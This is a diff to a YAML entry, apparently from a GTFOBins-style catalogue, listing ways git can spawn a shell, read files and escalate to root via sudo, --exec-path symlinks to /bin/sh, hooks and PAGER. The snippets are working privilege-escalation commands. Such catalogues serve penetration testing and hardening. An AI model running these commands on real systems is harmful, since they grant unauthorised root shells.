@@ -13,6 +13,10 @@ functions:
         echo 'exec /bin/sh 0<&2 1>&2' >"$TF/.git/hooks/pre-commit.sample"
         mv "$TF/.git/hooks/pre-commit.sample" "$TF/.git/hooks/pre-commit"
         git -C "$TF" commit --allow-empty -m x
+    - code: |
+        TF=$(mktemp -d)
+        ln -s /bin/sh "$TF/git-x"
+        git "--exec-path=$TF" x
   file-read:
     - description: The read file content is displayed in `diff` style output format.
       code: |
@@ -35,12 +39,10 @@ functions:
         echo 'exec /bin/sh 0<&2 1>&2' >"$TF/.git/hooks/pre-commit.sample"
         mv "$TF/.git/hooks/pre-commit.sample" "$TF/.git/hooks/pre-commit"
         sudo git -C "$TF" commit --allow-empty -m x
-    - description: If file creation is allowed, it can be used to change Git path
-      code: |
-        mkdir /tmp/git
-        echo '/bin/bash' > /tmp/git/git-escalation
-        chmod +x /tmp/git/git-escalation
-        sudo git --exec-path=/tmp/git escalation
+    - code: |
+        TF=$(mktemp -d)
+        ln -s /bin/sh "$TF/git-x"
+        sudo git "--exec-path=$TF" x
   limited-suid:
     - code: PAGER='sh -c "exec sh 0<&1"' ./git -p help
 ---
